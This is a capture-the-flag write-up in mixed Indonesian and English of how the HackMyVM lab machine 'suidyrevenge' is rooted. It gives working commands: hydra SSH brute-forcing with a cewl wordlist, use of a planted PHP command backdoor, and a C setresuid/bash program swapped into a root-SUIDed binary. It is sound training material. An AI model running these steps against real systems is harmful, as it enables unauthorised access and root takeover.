---
layout: post
title:  "HackMyVM: suidyrevenge"
date:   2022-11-05
categories: hackmyvm
tags: [RCE, hydra, ssh, SUID]
---

Hello, this is small things i've been doing lately because of getting bored. kukira susah karena *difficulty*-nya. ya, cuma buka scan nmap terus crawling semua text, masuk ke hydra untuk bruteforce lalu dapet credentials-nya dan masuk lewat `ssh`. dan ya biasanya lagi, jalanin `linpeas` dan dapet suid binary yang sebelumnya ada `note.txt` tertulis kalo `root` bakal *autorun* sebuah script untuk ganti *owner* dan beri akses *suid* dan boom rooted.

## nmap scanning
```
╭─ via [machines/suidyrevenge]
╰─ cat scan_tcp         
# Nmap 7.92 scan initiated Fri Nov  4 23:17:33 2022 as: nmap -vvv -p 22,80 -sCV -A -oN scan_tcp 192.168.56.28
Nmap scan report for 192.168.56.28
Host is up, received syn-ack (0.00044s latency).
Scanned at 2022-11-04 23:17:41 WIB for 7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 99:04:21:6d:81:68:2e:d7:fe:5e:b2:2c:1c:a2:f5:3d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAG/AX+0fiqIOG/5Jb4HuzPcAIdWkKC9AY7R9eqeSvykjKD3T3cVL5rbWGz3vfkBBDqVAp6l6Fj3CGsS6h4jKrnObsoDxtfIMAgspLQF9b9KjMEcM0aLDQKusQI5H9C5/HMsC50qx7XZUeOoTDinNR4wFjBls2PcbY8IJoRtapRYxvkRHc4l+eSpZk8+NJ2Z0xGYljlCwketld9+9BZuKEBThRvms+5ZQ8AQntoG7mD2JgeIIHr5vxU62ECM5V1EWhAnW8KEI3otZKAOpU48p3r+pWpAeGJJapWAx8f+IPzDWpR7BwosImvRvUgXgqqvPwkqCL9t8HJrieWcIrm1a1
|   256 b2:4e:c2:91:2a:ba:eb:9c:b7:26:69:08:a2:de:f2:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGWoTM7aAsBYvrYZYL4vz9sEaD+Pf0pYs61DwxR0zyK8de0rg+OoAnDz217AhoO78rRAqAdrE6382xpHKcmrm8I=
|   256 66:4e:78:52:b1:2d:b6:9a:8b:56:2b:ca:e5:48:55:2d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII4uRBZ1dmmy2uld4YwTO9LQeMWjp7nsQLNZXsg+nBfl
80/tcp open  http    syn-ack nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov  4 23:17:48 2022 -- 1 IP address (1 host up) scanned in 14.33 seconds
```
* `22/TCP open` with OpenSSH 7.9p1 Service as ssh that runs on Debian.
* `80/TCP open` with Nginx 1.14.2 as HTTP.

ketika saya cari lebih tentang exploit yang ada, ternyata semunya sudah *up-to-dated*

-

## web source info
kurang menarik bukan? mari lihat `web source`nya. (sebenarnya saya sudah buka full tampilan *frontend* tapi isinya cuma kaya gini, ya jadi saya kasih seperti di bawah :)).
```sh
╭─ via [machines/suidyrevenge]
╰─ curl -v $victim
*   Trying 192.168.56.28:80...
* Connected to 192.168.56.28 (192.168.56.28) port 80 (#0)
> GET / HTTP/1.1
> Host: 192.168.56.28
> User-Agent: curl/7.86.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.14.2
< Date: Fri, 04 Nov 2022 18:14:00 GMT
< Content-Type: text/html
< Content-Length: 322
< Last-Modified: Thu, 01 Oct 2020 18:11:16 GMT
< Connection: keep-alive
< ETag: "5f761bc4-142"
< Accept-Ranges: bytes
< 
Im proud to announce that "theuser" is not anymore in our servers.
Our admin "mudra" is the best admin of the world.
-suidy

<!--

"mudra" is not the best admin, IM IN!!!!
He only changed my password to a different but I had time
to put 2 backdoors (.php) from my KALI into /supersecure to keep the access!

-theuser

-->
* Connection #0 to host 192.168.56.28 left intact
```

## dir bruteforce
saya coba directory bruteforce pada `/supersecure/` untuk mencari backdoor yang dimaksud.
```
╭─ via [machines/suidyrevenge]
╰─ cat url_gobuster_2 
/simple-backdoor.php  (Status: 200) [Size: 28]
╭─ via [machines/suidyrevenge]
╰─ curl -s $victim/supersecure/simple-backdoor.php
cmd parameter is my friend.
╭─ via [machines/suidyrevenge]
╰─ curl -s "$victim/supersecure/simple-backdoor.php?cmd=id"                                                                  3 ↵
cmd parameter is my friend.
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>% 
```

## shell ass theuser
karena kelamaan, saya sambi dengan scraping text yang ada pake `cewl` untuk ngetest aja apakah bisa dibruteforce atau tidak menggunakan `hydra`.
```bash
╭─ via [machines/suidyrevenge]
╰─ cewl $victim > wordlists                                                                                                
╭─ via [machines/suidyrevenge]
╰─ cat wordlist                                                                                                            
the
admin
theuser
not
mudra
best
proud
announce
that
anymore
our
servers
Our
world
suidy
only
changed
password
different
but
had
time
put
backdoors
php
from
KALI
into
supersecure
keep
access
╭─ via [machines/suidyrevenge]
╰─ hydra -L wordlist -P wordlist -f $victim ssh -s -V -I -t 4
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-05 01:54:49
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 961 login tries (l:31/p:31), ~241 tries per task
[DATA] attacking ssh://192.168.56.28:22/
[STATUS] 39.00 tries/min, 39 tries in 00:01h, 922 to do in 00:24h, 4 active
[22][ssh] host: 192.168.56.28   login: theuser   password: different
[STATUS] attack finished for 192.168.56.28 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-05 01:56:55
```
lalu saya login lewat ssh dan get the user flag.
```
╭─ via [machines/suidyrevenge]
╰─ ssh theuser@$victim
theuser@192.168.56.28's password: 
Linux suidyrevenge 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Nov  4 13:34:47 2022 from 192.168.56.1
theuser@suidyrevenge:~$ ls
user.txt
theuser@suidyrevenge:~$
```

## privesc

seperti biasa pencarian *SUID binary* karena nama mesinnya mengindikasikan.
```
theuser@suidyrevenge:~$ find / -perm -4000 2>/dev/null
/home/suidy/suidyyyyy
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/umount
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/mount
/usr/bin/violent
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/passwd
theuser@suidyrevenge:~$ /home/suidy/suidyyyyy 
suidy@suidyrevenge:~$
```
Well saya sudah cek `sudo -l` dan tetap tidak ada respon, ngecek `crontab` sama saja. lalu saya analisis `suidyyyyy`. tetap tidak ada yang menarik. lalu saya mencoba untuk ke `HOME` dari user `suidy` dan menemukan `note.txt`
```
I know that theuser is not here anymore but suidyyyyy is now more secure!
root runs the script as in the past that always gives SUID to suidyyyyy binary
but this time also check the size of the file.
WE DONT WANT MORE "theuser" HERE!.
WE ARE SECURE NOW.

-suidy
```
setelah itu, saya *just in case* dengan membuat `small script` yang terbuat dari bahasa C.
```c
#include <stdio.h>
#include <stdlib.h>

void main() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
lalu saya compile dan saya beri izin `executable` agar nanti bisa dieksekusi.
```
suidy@suidyrevenge:/home/suidy# gcc exploit.c -o exploit.o
suidy@suidyrevenge:/home/suidy# mv exploit.o suidyyyyy
suidy@suidyrevenge:/home/suidy# chmod 4755 suidyyyyy
suidy@suidyrevenge:/home/suidy# ls -la | grep "suidyyyyy"
-rwsr-sr-x 1 suidy theuser  16664 Nov  4 15:13 suidyyyyy
```
in other words, i be waiting for the time with `pspy64`.
```
2022/11/04 13:47:29 CMD: UID=0    PID=101    | 
2022/11/04 13:47:29 CMD: UID=0    PID=100    | 
2022/11/04 13:47:29 CMD: UID=0    PID=10     | 
2022/11/04 13:47:29 CMD: UID=0    PID=1      | /sbin/init 
2022/11/04 13:47:52 CMD: UID=1004 PID=14068  | -bash 
2022/11/04 13:47:57 CMD: UID=0    PID=14069  | 
2022/11/04 13:48:01 CMD: UID=0    PID=14070  | /usr/sbin/CRON -f 
2022/11/04 13:48:01 CMD: UID=0    PID=14071  | /usr/sbin/CRON -f 
2022/11/04 13:48:01 CMD: UID=0    PID=14072  | /bin/sh -c sh /root/script.sh 
2022/11/04 13:48:01 CMD: UID=0    PID=14073  | sh /root/script.sh 
2022/11/04 13:48:01 CMD: UID=0    PID=14074  | sh /root/script.sh 
2022/11/04 13:48:01 CMD: UID=0    PID=14075  | sh /root/script.sh 
2022/11/04 13:48:01 CMD: UID=0    PID=14076  | sh /root/script.sh 
2022/11/04 13:48:01 CMD: UID=0    PID=14077  | sh /root/script.sh 
2022/11/04 13:48:01 CMD: UID=0    PID=14078  | sh /root/script.sh 
```
Wooopppp.
```
suidy@suidyrevenge:/home/suidy$ ls -la | grep "suidyyyyy"
-rwsrws--- 1 root  theuser  16712 Nov  4 15:14 suidyyyyy
```
tinggal execute aja ma brother.
```
suidy@suidyrevenge:/home/suidy$ ./suidyyyyy 
root@suidyrevenge:/home/suidy# ls -la /root
total 56
drwx------  3 root root  4096 Oct  2  2020 .
drwxr-xr-x 18 root root  4096 Oct  1  2020 ..
-rw-------  1 root root   127 Oct  2  2020 .bash_history
-rw-r--r--  1 root root   570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root  4096 Oct  1  2020 .local
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rw-r-----  1 root root  1961 Oct  2  2020 root.txt
-rwxr-x--x  1 root root   517 Oct  1  2020 script.sh
-rw-r--r--  1 root root    66 Oct  1  2020 .selected_editor
-rwxr-xr-x  1 root root 16712 Oct  2  2020 suidyyyyy
```

## References
* <https://book.hacktricks.xyz/linux-hardening/privilege-escalation>

